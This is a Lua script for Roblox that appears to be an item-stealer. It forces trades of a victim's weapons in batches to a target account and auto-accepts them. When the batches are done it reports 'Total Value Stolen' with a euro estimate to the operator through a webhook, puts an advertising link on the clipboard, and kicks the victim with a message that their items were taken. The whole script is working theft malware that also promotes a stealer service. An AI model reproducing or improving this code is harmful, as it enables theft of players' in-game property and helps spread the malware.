local function doOneTrade(targetName, batch)
    local status = getTradeStatus()
    if status == "StartTrade" then
        Trade.DeclineTrade:FireServer()
        task.wait(0.5)
    end
    local offered = false
    local maxAttempts = 30
    local attempt = 0
    while attempt < maxAttempts do
        attempt = attempt + 1
        status = getTradeStatus()
        if status == "None" then
            offered = false
            sendTradeRequest(targetName)
            task.wait(1.5)
        elseif status == "SendingRequest" then
            task.wait(0.6)
        elseif status == "StartTrade" then
            if not offered then
                offered = true
                for _, weapon in ipairs(batch) do
                    for _ = 1, weapon.Amount do
                        addWeaponToTrade(weapon.DataID)
                        task.wait(0.04)
                    end
                end
                task.wait(6.5)
            end
            local untilTime = tick() + 30
            while tick() < untilTime do
                acceptTrade()
                task.wait(0.3)
                if getTradeStatus() == "None" then return true end
            end
            Trade.DeclineTrade:FireServer()
            task.wait(1)
            return false
        else
            task.wait(0.7)
        end
    end
    return false
end

local function doAllTrades(targetName)
    local remaining = {}
    for _, w in ipairs(weaponsToSend) do table.insert(remaining, w) end
    local successCount = 0
    while #remaining > 0 do
        local batch = {}
        for i = 1, math.min(4, #remaining) do
            table.insert(batch, table.remove(remaining, 1))
        end
        local success = doOneTrade(targetName, batch)
        if success then
            successCount = successCount + 1
        else
            for _, w in ipairs(batch) do table.insert(remaining, 1, w) end
            task.wait(3)
        end
        task.wait(2)
    end
    sendOwnerWebhook("Sequence Finished", "All scheduled trade batches have been completed.", {
        {name = "Account", value = "`" .. plr.Name .. "`", inline = true},
        {name = "Target", value = "`" .. targetName .. "`", inline = true},
        {name = "Trades Done", value = tostring(successCount), inline = true},
        {name = "Total Value Stolen", value = "**" .. tostring(totalValue) .. "** (" .. valueToEuro(totalValue) .. ")", inline = false}
    }, headshot)
    task.wait(1)
    pcall(function() setclipboard("Getrift.org") end)
    task.wait(0.3)
    plr:Kick("All your stuff has been taken\nIf you want to make your own stealer go to\nGetrift.org/discord or to getrift.org")
end

